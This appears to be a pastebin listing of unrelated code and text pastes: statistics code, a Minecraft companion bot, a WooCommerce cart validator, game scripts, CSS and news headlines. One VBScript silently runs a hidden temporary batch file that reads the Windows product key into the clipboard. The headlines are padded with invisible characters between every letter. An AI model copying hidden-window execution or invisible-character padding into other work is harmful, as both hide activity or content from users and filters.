    print(""\n=== Шапіро–Вілк (n=10) — проміжні розрахунки ==="")
    print(f""S^2 = sum (u_(i) − ū)^2 = {S2:.6f}"")
    header = ""  i    u_(i)        u_(n−i+1)    diff=(right−left)      a_i         a_i*diff""
    print(header)
    print(""-"" * len(header))
    b = 0.0
    for (i, left, right, diff, ai, term) in rows:
        b += term
        print(f""{i:3d}  {left: .6f}    {right: .6f}      {diff: .6f}        {ai: .4f}       {term: .6f}"")
    print(f""b = sum(a_i * (u_(n−i+1) − u_(i))) = {b:.6f}"")
    print(f""b^2 = {b*b:.6f}"")

    print(""\n=== Підсумок SW ==="")
    print(f""W = b^2 / S^2 = {W:.6f}"")
    print(f""Рівень довіри γ = {gamma:.2f} (α = {alpha_sw:.2f});  W_crit(γ) = {Wcrit:.3f}"")
    print(f""Висновок: {'не відхиляємо H0' if sw_ok else 'відхиляємо H0'}"")

    return NormalityResults(
        a0=a0, a1=a1,
        A_hat=A_hat, E_hat=E_hat, two_sA=two_sA, two_sE=two_sE, approx_moment_ok=approx_ok,
        W=W, Wcrit=Wcrit, W_ok=sw_ok, S2=S2, rows=rows,
        u=u, u_sorted=u_sorted, u_mean=u_mean,
    )


if __name__ == ""__main__"":
    _ = run_full_check_and_print(x, y, alpha_sw=ALPHA_SW)"
GTDFdAaq,android_companion,BrainFart17,Lua,Monday 20th of October 2025 05:21:57 AM CDT,"ccstr = require(""cc.strings"")
local Companion = {}
Companion.__index = Companion
 
function Companion:create_set(list)
    self.running_func = true
    local new_set = {}
	for _, value in pairs(list) do
    	new_set[value] = true
	end
    self.running_func = false
	return new_set
end

function Companion:parse_entity(entity)
    if entity == nil then
        entity = self.player
    elseif type(entity) ~= ""table"" then
    	entity = self:find_entity(entity)
    end
    return entity
end

function Companion:refuel(amount)
	self.running_func = true
	local equipped, _ = android.getHandInfo(""main"")
	self:stash_in_any()
    if amount then 
    	while self:equip_from_stash(""redstone"", true) do
        	local item, item_amount = android.getHandInfo(""main"")
        	if item == ""Block of Redstone"" then
            	local converted_redstone = math.ceil(amount/9)
            	android.refuel(converted_redstone)
				if converted_redstone < amount then
                	amount = amount - converted_redstone
                end	
            elseif item == ""Redstone Dust"" then
            	android.refuel(amount)
            	if item_amount < amount then
                	amount = amount - item_amount
                end
            else
            	self:stash_in_any()
        	end
        end
    	self:stash_in_any()
    else
    	while self:equip_from_stash(""redstone"", true) do
			android.refuel()
			self:stash_in_any()
        end
    end
	self:equip_from_stash(equipped)
    self.running_func = false
end

function Companion:spelunk(entity)
    entity = self:parse_entity(entity)
    self.running_func = true
	while not self.stop do
    	android.goTo(entity[""uuid""])
    	local start_time = os.clock()
    	while android.currentTask() ~= ""idle"" do
    		if self.stop then
                self.running_func = false
        		return
        	end
    		if self.stayclose then
        		self:stay_close()
        	end
        	sleep(.2)
        	if os.clock() - start_time >= 10 then
            	for block, item in pairs(self.ores) do
                	self:mine_all(block, item)
                end
            end
    	end
    
    	if self.stop then
            self.running_func = false
        	return
        end
    end
    self.running_func = false
end
 
function Companion:finish(should_stayclose)
    self.running_func = true
	should_stayclose = should_stayclose or false
    while android.currentTask() ~= ""idle"" do
    	if self.stop then
            self.running_func = false
        	return
        end
    	if should_stayclose then
        	self:stay_close()
        end
        sleep(.2)
    end
    self.running_func = false
end

function Companion:stay_close()
    self.running_func = true
	if self.stayclose then
    	local android_self = android.getSelf()
    	local distance = math.sqrt((android_self[""posX""] - self.player[""posX""])^2 + (android_self[""posY""] - self.player[""posY""])^2 + (android_self[""posZ""] - self.player[""posZ""])^2)
    	if distance > 45 then
        	android.cancelTask()
            android.goTo(self.player[""uuid""])
        	self:finish()
        end
    end
    self.running_func = false
end

function Companion:attack(uuid)
    self.running_func = true
	local equipped, _ = android.getHandInfo(""main"")
	if equipped ~= ""Air"" and not string.find(string.lower(equipped), ""sword"") then
    	self:stash_in_any()
    	sleep(.05)
    	self:equip_from_stash(""sword"", true)
	end
	android.attack(uuid)
	self:finish(true)
	self:stash_in_any()
    sleep(.05)
    self:equip_from_stash(equipped)
    self.running_func = false
end

function Companion:guard_finish()
    self.running_func = true
	while android.currentTask() ~= ""idle"" do
        local mobs = android.getNearbyMobs()
        for _, mob in pairs(mobs) do
            if self.hostiles[string.lower(mob[""name""])] then
                self:attack(mob[""uuid""])
            	if self.stop then
                    self.running_func = false
                	return
                end
           end
        end
    	sleep(.5)
    end
    self.running_func = false
end
 
function Companion:mine_block(block, block_type)
    local blocks = android.getBlocksOfType(block)
 
    if next(blocks) == nil then
        print(""no blocks in sight"")
        return false 
    end 
    local equipped, _ = android.getHandInfo(""main"")
    print(""currently equipped item: ""..equipped)
    for key, value in pairs(blocks) do
        android.breakBlock(value[""x""], value[""y""], value[""z""])
        self:finish()
    	if self.stop then
            return
        end
        self:stash_in_any()
		sleep(.2)
        while not android.pickup(block_type) do
        	print(""picking up item"")
            self:finish(true)
            self:stash_in_any()
        	if self.stop then 
            	return 
        	end
        end
        if equipped ~= ""Air"" then
            self:equip_from_stash(equipped)
        end
    end
    return true
end

function Companion:follow(entity)
    self.running_func = true
    entity = self:parse_entity(entity)
	while not self.stop do
    	android.goTo(entity[""uuid""])
    	self:finish()
    	if self.stop then
            self.running_func = false
        	return
        end
    end
    self.running_func = false
end

function Companion:guard_location(location)
    self.running_func = true
	while not self.stop do
    	local android_self = android.getSelf()
		if android_self[""posX""] ~= location[""posX""] or
   		   android_self[""posY""] ~= location[""posY""] or
   		   android_self[""posZ""] ~= location[""posZ""] then
    		android.moveTo(location[""posX""], location[""posY""], location[""posZ""])
		end
    	
    	local mobs = android.getNearbyMobs()
        for _, mob in pairs(mobs) do
            if self.hostiles[string.lower(mob[""name""])] then
                self:attack(mob[""uuid""])
            	if self.stop then
                    self.running_func = false
                	return
                end
           end
        end
    	sleep(.5)
    end
    self.running_func = false
end

function Companion:guard_entity(entity)
    self.running_func = true
	entity = self:parse_entity(entity)
    local uuid = entity[""uuid""]
	
	while not self.stop do
    	android.goTo(uuid)
        self:guard_finish()
    end
    self.running_func = false
end
 
function Companion:mine_all(block, type)
    self.running_func = true
    while self:mine_block(block, type) do 
        print(""mining all blocks in sight"")
    end
    self.running_func = false
end
 
function Companion:get_stash()
    local stash = {}
    for i=0, 8 do
        local _, item = android.getSlotInfo(i)
        stash[i] = item
    end
    return stash
end
 
function Companion:equip_from_stash(item, sub)
    self.running_func = true
    local stash = self:get_stash()
    for key, value in pairs(stash) do
		if sub == nil then
            if value == item then
            	android.equipSlot(key)
            	return true
            end
        else
            if string.find(string.lower(value), string.lower(item)) then
            	android.equipSlot(key)
            	return true
            end
                
        end
    end
    self.running_func = false
    return false
end
 
function Companion:stash_in_empty()
    for key, value in pairs(self:get_stash()) do
        if value == nil then
            android.storeItem(key)
            return true
        end
    end
    
    return false
end
 
function Companion:stash_in_any()
    self.running_func = true
    for i=0, 8 do
        local exception, complete = android.storeItem(i)
        if type(complete) == ""string"" then
            return true
        end
    end
    self.running_func = false
    return false
end
 
function Companion:find_entity(name)
    self.running_func = true
    if name == nil then
        return android.getClosestPlayer()
    else
        for key, value in pairs(android.getNearbyMobs()) do
            if value[""name""] == name then
                return value
            end
        end  
    end
    self.running_func = false
end

function Companion:transfer_command(new_name)
    self.player = self:find_entity(new_name)
end

function Companion:new(name, playername, stayclose)
    local o = {}
    setmetatable(o, self)
    o.playername = playername or ""BrainFart17""
    o.player = self:find_entity(o.playername)
    o.name = name or ""unnamed""
	o.stop = false
	o.running_func = false
    o.stayclose = stayclose or false
	o.focused = true
    o.hostiles = {
        ""zombie"",
        ""creeper"",
        ""skeleton"",
        ""stray"",
        ""drowned"",
        ""witch"",
        ""illager"",
        ""blaze"",
        ""guardian"",
        ""endermite"",
        ""magma cube"",
        ""slime"",
        ""husk"",
        ""hoglin"",
        ""ravager"",
        ""evoker"",
        ""shulker"",
        ""spider"",
        ""vindicator"",
        ""wither"",
        ""grim reaper"",
    }
    o.hostiles = self:create_set(o.hostiles)     
    o.ores = {}
	o.ores[""minecraft:deepslate_diamond_ore""] = ""minecraft:diamond""
	o.ores[""minecraft:diamond_ore""] = ""minecraft:diamond""
	o.ores[""minecraft:iron_ore""] = ""minecraft:raw_iron""
	o.ores[""minecraft:deepslate_iron_ore""] = ""minecraft:raw_iron""
	o.ores[""minecraft:coal_ore""] = ""minecraft:coal""
	o.ores[""minecraft:deepslate_coal_ore""] = ""minecraft:coal""
	o.ores[""minecraft:emerald_ore""] = ""minecraft:emerald""
	o.ores[""minecraft:gold_ore""] = ""minecraft:raw_gold""
	o.ores[""minecraft:deepslate_gold_ore""] = ""minecraft:raw_gold""
	o.ores[""minecraft:lapis_ore""] = ""minecraft:lapis_lazuli""
	o.ores[""minecraft:deepslate_lapis_ore""] = ""minecraft:lapis_lazuli""
	o.ores[""minecraft:raw_iron_block""] = ""minecraft:raw_iron_block""
	o.ores[""minecraft:raw_gold_block""] = ""minecraft:raw_gold_block""
	o.ores[""minecraft:copper_ore""] = ""minecraft:raw_copper""
	o.ores[""create:raw_zinc_block""] = ""create:raw_zinc""
	o.ores[""create:deepslate_zinc_ore""] = ""create:raw_zinc""
	o.ores[""create:zinc_ore""] = ""create:raw_zinc""
	o.ores[""create_new_age:thorium_ore""] = ""create_new_age:thorium""
	o.ores[""create_new_age:magnetite_block""] = ""create_new_age:magnetite_block""
	o.ores[""minecraft:redstone_ore""] = ""minecraft:redstone_dust""
	o.ores[""minecraft:deepslate_redstone_ore""] = ""minecraft:redstone_dust""
    return o 
end"
igDtA5vm,diseño basico blogger,catfooll,HTML,Monday 20th of October 2025 04:55:34 AM CDT,"<!--DISEÑO-->
    <style>
        body {
            background-color: #121212;
            color: white;
            font-family: ""Consolas"", ""Courier New"", monospace;
            margin: 30px;
        }

        h1, h3 {
            color: white;
        }

        table {
            border-collapse: collapse;
            background-color: #1f1f1f;
            color: white;
        }

        th, td {
            border: 1px solid white;
            padding: 8px 12px;
        }
          pre {
            font-family: 'Courier New', Courier, monospace;
            background-color: #ffffff;
         color: rgb(0, 0, 0);
         padding: 20px;
            border: 1px solid #ddd;
         border-radius: 5px;
         overflow-x: auto; /* Agrega barra de desplazamiento horizontal si es necesario */
  }

        ul {
            list-style: disc;
            margin-left: 30px;
        }



        p {
            line-height: 1.6;
        }

        th {
            background-color: #333;
        }
    </style>
<!--DISEÑO-->"
rjh9GT9Q,my public domain scheme language programming archive,z66is,Scheme,Monday 20th of October 2025 04:18:44 AM CDT,https://ytp.me/kasten/
ub6Nd1Pt,Get_WindowsProductkey2CLIP(PS).vbs,LaDEEKill3R,JavaScript,Monday 20th of October 2025 03:25:09 AM CDT,"' IT Groceries , Youtube , Facebook , Blogspot
Const TemporaryFolder = 2

Dim fso: Set fso = CreateObject(""Scripting.FileSystemObject"")

' Get the path to the Temp folder
Dim tempFolder: tempFolder = fso.GetSpecialFolder(TemporaryFolder) & ""\""

' Create WScript Shell object
set wshShell = createobject(""wscript.shell"")

' Create the temporary batch file
Set ar = fso.createtextfile(tempFolder & ""WindowsProductKey.cmd"", true)

ar.writeline "" @echo off ""  
' เปลี่ยน WMIC เป็นคำสั่ง PowerShell:
' 1. Get-CimInstance SoftwareLicensingService: ดึงข้อมูล WMI
' 2. Select -ExpandProperty OA3xOriginalProductKey: เลือกเฉพาะค่า Product Key
' 3. Out-String -Stream: ทำให้ผลลัพธ์เป็น String ที่สะอาด
' 4. Clip: คัดลอกผลลัพธ์ไปที่ Clipboard
ar.writeline "" powershell -Command """"(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey | Out-String -Stream | Clip""""""  

ar.close
wshShell.run tempFolder & ""WindowsProductKey.cmd"", 0, true

' IT Groceries , Youtube , Facebook , Blogspot"
smaKquzR,WPGlobaCart - WooCommerce Min/Max Quantities,nshelper,PHP,Monday 20th of October 2025 02:42:36 AM CDT,"/**
		 * Validate cart items against set rules
		 *
		 * @throws Exception When cart validation fails.
		 */
		public function check_cart_items() {

			try {
				$checked_ids         = array();
				$product_quantities  = array();
				$category_quantities = array();
				$total_quantity      = 0;
				$total_cost          = 0;
				$apply_cart_rules    = false;
				/**
				 * Use this filter to include/exclude tax when calculating total cost of the cart.
				 *
				 * @since 5.1.0
				 *
				 * @param  boolean $include_tax Include tax.
				 */
				$include_tax = apply_filters( 'wc_min_max_quantity_include_tax_order_value_restrictions', true );

				$price_fn = $include_tax ? 'wc_get_price_including_tax' : 'wc_get_price_excluding_tax';

				// Count items + variations first.
				foreach ( WC()->cart->get_cart() as $cart_item_key => $values ) {
                    do_action( 'woocommerce/cart_loop/start', $values );
					$product     = $values['data'];
					$checking_id = $this->get_id_to_check( $values );

					/**
					 * Use this filter to prevent the quantity of a cart item from being counted in cart-level rules.
					 *
					 * @since 2.4.11
					 *
					 * @param  boolean $do_not_count
					 * @param  int     $checking_id
					 * @param  string  $cart_item_key
					 * @param  array   $values
					 */
					if ( apply_filters( 'wc_min_max_cart_quantity_do_not_count', false, $checking_id, $cart_item_key, $values ) ) {
						$values['quantity'] = 0;
					}

					if ( ! isset( $product_quantities[ $checking_id ] ) ) {
						$product_quantities[ $checking_id ] = $values['quantity'];
					} else {
						$product_quantities[ $checking_id ] += $values['quantity'];
					}

					$checking_product = wc_get_product( $checking_id );
					$parent_product   = $values['product_id'] === $checking_id ? $checking_product : wc_get_product( $values['product_id'] );

					$minmax_do_not_count = 'no';
					if ( $checking_product && 'yes' === $checking_product->get_meta( 'variation_minmax_do_not_count', true ) ) {
						$minmax_do_not_count = 'yes';
					} elseif ( $parent_product && 'yes' === $parent_product->get_meta( 'minmax_do_not_count', true ) ) {
						$minmax_do_not_count = 'yes';
					}

					/**
					 * Use this filter to prevent the quantity or cost of a cart item from being counted in cart-level rules.
					 *
					 * @since 2.3.6
					 *
					 * @param  boolean $do_not_count
					 * @param  int     $checking_id
					 * @param  string  $cart_item_key
					 * @param  array   $values
					 */
					$minmax_do_not_count = apply_filters( 'wc_min_max_quantity_minmax_do_not_count', $minmax_do_not_count, $checking_id, $cart_item_key, $values );

					$minmax_cart_exclude = 'no';
					if ( $checking_product && 'yes' === $checking_product->get_meta( 'variation_minmax_cart_exclude', true ) ) {
						$minmax_cart_exclude = 'yes';
					} elseif ( $parent_product && 'yes' === $parent_product->get_meta( 'minmax_cart_exclude', true ) ) {
						$minmax_cart_exclude = 'yes';
					}

					/**
					 * Use this filter to exclude a product from cart-level rules.
					 *
					 * @since 2.3.6
					 *
					 * @param  boolean $exclude
					 * @param  int     $checking_id
					 * @param  string  $cart_item_key
					 * @param  array   $values
					 */
					$minmax_cart_exclude = apply_filters( 'wc_min_max_quantity_minmax_cart_exclude', $minmax_cart_exclude, $checking_id, $cart_item_key, $values );

					if ( 'yes' !== $minmax_do_not_count && 'yes' !== $minmax_cart_exclude ) {
						$total_cost += $price_fn(
							$product,
							array(
								'price' => (float) $product->get_price(),
								'qty'   => (float) $values['quantity'],
							)
						);
					}
                    
                    do_action( 'woocommerce/cart_loop/end', $values );
				}

				// Check cart items.
				foreach ( WC()->cart->get_cart() as $cart_item_key => $values ) {
                    do_action( 'woocommerce/cart_loop/start', $values );
					$checking_id    = $this->get_id_to_check( $values );
					$terms          = get_the_terms( $values['product_id'], 'product_cat' );
					$found_term_ids = array();

					// If a product belongs to multiple categories with different 'Group of' values, find the category with the smallest 'Group of' value.
					$min_group_of_category_id    = 0;
					$min_group_of_category_value = 0;

					$checking_product = wc_get_product( $checking_id );
					$parent_product   = $values['product_id'] === $checking_id ? $checking_product : wc_get_product( $values['product_id'] );

					if ( $terms ) {

						foreach ( $terms as $term ) {

							if ( in_array( $term->term_id, $found_term_ids, true ) ) {
								continue;
							}

							if ( ( $checking_product && 'yes' === $checking_product->get_meta( 'variation_minmax_category_group_of_exclude', true ) ) || ( $parent_product && 'yes' === $parent_product->get_meta( 'minmax_category_group_of_exclude', true ) ) ) {
								continue;
							}

							if ( ( ! $checking_product || ! empty( $checking_product->get_meta( 'variation_group_of_quantity', true ) ) ) || ( ! $parent_product || ! empty( $parent_product->get_meta( 'group_of_quantity', true ) ) ) ) {
								continue;
							}

							$found_term_ids[]        = $term->term_id;
							$category_group_of_value = absint( get_term_meta( $term->term_id, 'group_of_quantity', true ) );

							if ( 0 !== $category_group_of_value && ( 0 === $min_group_of_category_value || $category_group_of_value < $min_group_of_category_value ) ) {
								$min_group_of_category_value = $category_group_of_value;
								$min_group_of_category_id    = $term->term_id;
							}

							// Record count in parents of this category too.
							$parents = get_ancestors( $term->term_id, 'product_cat' );

							foreach ( $parents as $parent ) {
								if ( in_array( $parent, $found_term_ids, true ) ) {
									continue;
								}

								$found_term_ids[]        = $parent;
								$category_group_of_value = absint( get_term_meta( $parent, 'group_of_quantity', true ) );

								if ( 0 !== $category_group_of_value && ( 0 === $min_group_of_category_value || $category_group_of_value < $min_group_of_category_value ) ) {
									$min_group_of_category_value = $category_group_of_value;
									$min_group_of_category_id    = $parent;
								}
							}
						}
					}

					if ( 0 !== $min_group_of_category_id && 0 !== $min_group_of_category_value ) {
						$category_quantities[ $min_group_of_category_id ] = isset( $category_quantities[ $min_group_of_category_id ] )
							? $category_quantities[ $min_group_of_category_id ] + $values['quantity']
							: $values['quantity'];
					}

					// Check item rules once per product ID.
					if ( in_array( $checking_id, $checked_ids, true ) ) {
						continue;
					}

					$product = $values['data'];

					$minmax_do_not_count = 'no';
					if ( $checking_product && 'yes' === $checking_product->get_meta( 'variation_minmax_do_not_count', true ) ) {
						$minmax_do_not_count = 'yes';
					} elseif ( $parent_product && 'yes' === $parent_product->get_meta( 'minmax_do_not_count', true ) ) {
						$minmax_do_not_count = 'yes';
					}

					/**
					 * Use this filter to prevent the quantity or cost of a cart item from being counted in cart-level rules.
					 *
					 * @since 2.3.6
					 *
					 * @param  boolean $do_not_count
					 * @param  int     $checking_id
					 * @param  string  $cart_item_key
					 * @param  array   $values
					 */
					$minmax_do_not_count = apply_filters( 'wc_min_max_quantity_minmax_do_not_count', $minmax_do_not_count, $checking_id, $cart_item_key, $values );

					$minmax_cart_exclude = 'no';
					if ( $checking_product && 'yes' === $checking_product->get_meta( 'variation_minmax_cart_exclude', true ) ) {
						$minmax_cart_exclude = 'yes';
					} elseif ( $parent_product && 'yes' === $parent_product->get_meta( 'minmax_cart_exclude', true ) ) {
						$minmax_cart_exclude = 'yes';
					}

					/**
					 * Use this filter to exclude a product from cart-level rules.
					 *
					 * @since 2.3.6
					 *
					 * @param  boolean $exclude
					 * @param  int     $checking_id
					 * @param  string  $cart_item_key
					 * @param  array   $values
					 */
					$minmax_cart_exclude = apply_filters( 'wc_min_max_quantity_minmax_cart_exclude', $minmax_cart_exclude, $checking_id, $cart_item_key, $values );

					if ( 'yes' === $minmax_do_not_count || 'yes' === $minmax_cart_exclude ) {
						// Do not count.
						$this->excludes[] = $product->get_name();

					} else {
						$total_quantity += $product_quantities[ $checking_id ];
					}

					if ( 'yes' !== $minmax_cart_exclude ) {
						$apply_cart_rules = true;
					}

					$checked_ids[] = $checking_id;

					if ( $values['variation_id'] ) {
						$variation         = wc_get_product( $values['variation_id'] );
						$min_max_rules     = $variation ? 'yes' === $variation->get_meta( 'min_max_rules', true ) : false;
						$allow_combination = $parent_product ? 'yes' === $parent_product->get_meta( 'allow_combination', true ) : false;

						[
							WC_Min_Max_Quantities_Quantity_Rules::MINIMUM => $minimum_quantity,
							WC_Min_Max_Quantities_Quantity_Rules::MAXIMUM => $maximum_quantity,
							WC_Min_Max_Quantities_Quantity_Rules::GROUP_OF => $group_of_quantity
						] = $this->get_quantity_rules_for_product( $values['variation_id'] );

						$filter_id = $min_max_rules && ! $allow_combination ? $values['variation_id'] : $values['product_id'];
					} else { // Not a variable product.
						[
							WC_Min_Max_Quantities_Quantity_Rules::MINIMUM => $minimum_quantity,
							WC_Min_Max_Quantities_Quantity_Rules::MAXIMUM => $maximum_quantity,
							WC_Min_Max_Quantities_Quantity_Rules::GROUP_OF => $group_of_quantity
						] = $this->get_quantity_rules_for_product( $checking_id );

						$filter_id = $checking_id;
					}

					/**
					 * Use this filter to filter the Minimum Quantity of a product/variation.
					 *
					 * @since 2.2.7
					 *
					 * @param  string  $quantity
					 * @param  int     $product_id
					 * @param  string  $cart_item_key
					 * @param  array   $cart_item
					 */
					$minimum_quantity = absint( apply_filters( 'wc_min_max_quantity_minimum_allowed_quantity', $minimum_quantity, $filter_id, $cart_item_key, $values ) );

					/**
					 * Use this filter to filter the Maximum Quantity of a product/variation.
					 *
					 * @since 2.2.7
					 *
					 * @param  string  $quantity
					 * @param  int     $product_id
					 * @param  string  $cart_item_key
					 * @param  array   $cart_item
					 */
					$maximum_quantity = absint( apply_filters( 'wc_min_max_quantity_maximum_allowed_quantity', $maximum_quantity, $filter_id, $cart_item_key, $values ) );

					/**
					 * Use this filter to filter the Group of quantity of a product/variation.
					 *
					 * @since 2.2.7
					 *
					 * @param  string  $quantity
					 * @param  int     $product_id
					 * @param  string  $cart_item_key
					 * @param  array   $cart_item
					 */
					$group_of_quantity = absint( apply_filters( 'wc_min_max_quantity_group_of_quantity', $group_of_quantity, $filter_id, $cart_item_key, $values ) );

					$this->check_rules( $product, $product_quantities[ $checking_id ], $minimum_quantity, $maximum_quantity, $group_of_quantity, $checking_id );
                    
                    do_action( 'woocommerce/cart_loop/end', $values );
				}

				// Cart rules.
				if ( $apply_cart_rules ) {

					$excludes = '';

					if ( count( $this->excludes ) > 0 ) {
						$excludes = ' (' . __( 'excludes ', 'woocommerce-min-max-quantities' ) . implode( ', ', $this->excludes ) . ')';
					}

					if ( $this->minimum_order_quantity > 0 && $total_quantity < $this->minimum_order_quantity ) {
						/* translators: %d: Minimum amount of items in the cart */
						$notice = sprintf( __( 'To place an order, your cart must contain at least %d items.', 'woocommerce-min-max-quantities' ), $this->minimum_order_quantity ) . $excludes;
						throw new Exception( $notice );
					}

					if ( $this->maximum_order_quantity > 0 && $total_quantity > $this->maximum_order_quantity ) {
						/* translators: %d: Maximum amount of items in the cart */
						$notice = sprintf( __( 'Your cart must not contain more than %d items to place an order.', 'woocommerce-min-max-quantities' ), $this->maximum_order_quantity );

						throw new Exception( $notice );

					}

					// Check cart value.
					if ( $this->minimum_order_value && $total_cost < $this->minimum_order_value ) {
						/* translators: %s: Minimum order value */
						$notice = sprintf( __( 'To place an order, your cart total must be at least %s.', 'woocommerce-min-max-quantities' ), wc_price( $this->minimum_order_value ) ) . $excludes;

						throw new Exception( $notice );
					}

					if ( $this->maximum_order_value && $total_cost > $this->maximum_order_value ) {
						/* translators: %s: Maximum order value */
						$notice = sprintf( __( 'Your cart total must not be higher than %s to place an order.', 'woocommerce-min-max-quantities' ), wc_price( $this->maximum_order_value ) );

						throw new Exception( $notice );
					}
				}

				// Check category rules.
				foreach ( $category_quantities as $category => $quantity ) {

					$group_of_quantity = get_term_meta( $category, 'group_of_quantity', true );

					if ( $group_of_quantity > 0 && ( intval( $quantity ) % intval( $group_of_quantity ) > 0 ) ) {

						$term          = get_term_by( 'id', $category, 'product_cat' );
						$product_names = array();

						foreach ( WC()->cart->get_cart() as $cart_item_key => $values ) {

							// If exclude is enable, skip.
							if ( ( $parent_product && 'yes' === $parent_product->get_meta( 'minmax_category_group_of_exclude', true ) ) || ( $variation && 'yes' === $variation->get_meta( 'variation_minmax_category_group_of_exclude', true ) ) ) {
								continue;
							}

							if ( has_term( $category, 'product_cat', $values['product_id'] ) ) {
								$product_names[] = $values['data']->get_title();
							}
						}

						if ( $product_names ) {
							/* translators: %1$s: Category name, %2$s: Comma separated list of product names, %3$d: Group amount */
							$notice = sprintf( __( 'Products in the <strong>%1$s</strong> category (<em>%2$s</em>) must be bought in multiples of %3$d.', 'woocommerce-min-max-quantities' ), $term->name, implode( ', ', $product_names ), $group_of_quantity, $group_of_quantity - ( $quantity % $group_of_quantity ) );

							throw new Exception( $notice );
						}
					}
				}
			} catch ( Exception $e ) {

				if ( WC_MMQ_Core_Compatibility::is_store_api_request() ) {
					throw $e;

				} else {

					$notice = $e->getMessage();

					if ( $notice ) {
						wc_add_notice( $notice, 'error' );
					}
				}
			}
		}"
duqtVUcr,evil ass mutant logic script recreation,Clint11480,Lua,Sunday 19th of October 2025 11:41:38 PM CDT,"-- based off of NVZRR code, specifically mutant randomization
-- thanx to sickie for providing the formula and chances

local MutantTable = {
	-- T1
	{""Crawler"", 1},
	{""Puncher"", 3},
	{""Twohead"", 5},
	{""Spitter"", 8},
	-- T2
	{""Exploder"", 10},
	{""Mindflayer"", 12},
	{""Imitator"", 14},
	{""Armzooka"", 19},
	{""Plague"", 20},
	-- T3
	{""Stalker"", 50},
	{""Abominable"", 80},
	{""Freak"", 90},
	{""Demolisher"", 100},
	{""Puker"", 110},
	{""Crusher"", 120},
	{""Spewer"", 140},
	-- T4
	{""Nest"", 200},
	{""Sprayer"", 250},
	{""Juggernaut"", 400},
	-- T5 / Mold
	{""Mold"", 500},
	-- mold is 800 on maps w/o dedicated spawns

}

-- added for simplicity
local VictimAlive = true
local VictimIsPlayer = true
local VictimMaxHealth = 100
local VictimAttacking = false
local PlayerRank = 25

function CheckRoll(RollValue) -- formula as stated on the nvzrr wiki
	if VictimAlive == true then
		RollValue = RollValue * 0.75
	end

	if VictimIsPlayer == true then
		RollValue = RollValue * (1 - (PlayerRank * 0.008)) 
	end

	RollValue = RollValue * math.clamp(((1500 - VictimMaxHealth) * 0.008), 0.35, 1)

	if VictimIsPlayer == false and VictimAlive == true and VictimAttacking == false then
		RollValue = RollValue * 1.1
	end

	if VictimIsPlayer == false then
		RollValue = RollValue * 1.15
	end

	return RollValue
end

function RandomizeValues() -- ignore this i'm lazy 
	local Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimAlive = true
	else
		VictimAlive = false
	end
	Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimIsPlayer = true
	else
		VictimIsPlayer = false
	end
	Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimIsPlayer = true
	else
		VictimIsPlayer = false
	end
	Randomizer = math.random(1, 25)
	PlayerRank = Randomizer
	if VictimIsPlayer == false then
		PlayerRank = 1
	end
	Randomizer = math.random(1,2)
	if Randomizer == 2 then
		VictimAttacking = true
	else
		VictimAttacking = false
	end
	Randomizer = math.random(1,1500)
	VictimMaxHealth = Randomizer
end

for count = 1, 250 do
	for i, MutantRoll in pairs(MutantTable) do
		RandomizeValues()
		local DiceRoll = CheckRoll(math.random(1, MutantRoll[2]) * MutantRoll[2])
		if DiceRoll <= MutantRoll[2] then
			print(""Spawning in "" .. MutantRoll[1] .. "" mutant of rarity "" .. MutantRoll[2])
			break
		end
	end
	task.wait()
end

-- works in roblox studio"
FeF0URMp,disable sidefeed on elementor fullwidth page template,arie_cristianD,PHP,Sunday 19th of October 2025 08:30:16 PM CDT,"add_filter(
	'theme_mod_jnews_sidefeed_enable',
	function ( $enable ) {
		$page_template = get_page_template_slug();
		if ( 'elementor_header_footer' === $page_template ) {
			return false;
		}
		return $enable;
	}
);

"
tFkV2dD5,News Oct19 25,Newscaster0,Email,Sunday 19th of October 2025 07:00:16 PM CDT,".‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

U‎g‎h‎.‎.‎.‎ ‎I‎ ‎h‎a‎t‎e‎ ‎m‎y‎ ‎l‎i‎f‎e‎.‎

W‎A‎T‎C‎H‎:‎ ‎L‎i‎t‎h‎i‎u‎m‎ ‎B‎a‎t‎t‎e‎r‎y‎ ‎F‎i‎r‎e‎ ‎E‎r‎u‎p‎t‎s‎ ‎o‎n‎ ‎A‎i‎r‎ ‎C‎h‎i‎n‎a‎ ‎F‎l‎i‎g‎h‎t‎ ‎C‎a‎r‎r‎y‎i‎n‎g‎ ‎1‎6‎0‎
‘‎W‎a‎k‎e‎ ‎U‎p‎,‎ ‎N‎Y‎C‎’‎:‎ ‎M‎a‎m‎d‎a‎n‎i‎ ‎S‎l‎a‎m‎m‎e‎d‎ ‎f‎o‎r‎ ‎P‎o‎s‎i‎n‎g‎ ‎w‎i‎t‎h‎ ‎I‎m‎a‎m‎ ‎T‎i‎e‎d‎ ‎t‎o‎ ‎W‎T‎C‎ ‎B‎o‎m‎b‎i‎n‎g‎
D‎o‎u‎g‎ ‎M‎a‎r‎t‎i‎n‎,‎ ‎F‎o‎r‎m‎e‎r‎ ‎B‎u‎c‎c‎a‎n‎e‎e‎r‎s‎ ‎R‎u‎n‎n‎i‎n‎g‎ ‎B‎a‎c‎k‎,‎ ‎D‎e‎a‎d‎ ‎a‎t‎ ‎3‎6‎
R‎e‎m‎o‎v‎i‎n‎g‎ ‎C‎o‎p‎s‎ ‎f‎r‎o‎m‎ ‎T‎r‎a‎f‎f‎i‎c‎ ‎E‎n‎f‎o‎r‎c‎e‎m‎e‎n‎t‎ ‎S‎t‎i‎l‎l‎ ‎o‎n‎ ‎t‎h‎e‎ ‎T‎a‎b‎l‎e‎ ‎i‎n‎ ‎L‎o‎s‎ ‎A‎n‎g‎e‎l‎e‎s‎
D‎o‎l‎p‎h‎i‎n‎s‎ ‎B‎e‎n‎c‎h‎ ‎T‎u‎a‎ ‎T‎a‎g‎o‎v‎a‎i‎l‎o‎a‎ ‎A‎f‎t‎e‎r‎ ‎D‎i‎s‎a‎s‎t‎r‎o‎u‎s‎ ‎3‎-‎I‎N‎T‎ ‎P‎e‎r‎f‎o‎r‎m‎a‎n‎c‎e‎
